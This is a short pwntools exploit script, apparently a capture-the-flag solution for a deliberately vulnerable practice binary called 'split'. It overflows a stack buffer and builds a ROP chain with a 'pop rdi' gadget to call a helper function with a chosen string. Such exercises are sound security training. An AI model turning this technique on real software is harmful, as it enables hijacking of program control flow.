#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

gs='''
b *pwnme+77
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('split')
context.binary=elf

context(terminal=['tmux', 'split-window', '-h'])

useful_str=elf.symbols["usefulString"]
useful_fun=elf.symbols["usefulFunction"]

# Offset avant ecrasement de l'adresse de retour
offset=0x28
# gadget : pop rdi; ret
pop_rdi=0x04007c3


if len(sys.argv)>1 and sys.argv[1] == "-d":
    # gdb.attach(io,gs)
    io = gdb.debug([elf.path], gs)
    time.sleep(.5)
else:
    io = process([elf.path])

print(f"{useful_str=:x}")
print(f"{useful_fun=:x}")

io.recvuntil(b"> ")

# On retourne en useful_fun + 9  pour sauter l'affectation de edi dans la fonction
PL =b"A"*offset
PL+=p64(pop_rdi)
PL+=p64(useful_str)
PL+=p64(useful_fun+9)

io.sendline(PL)
io.interactive()

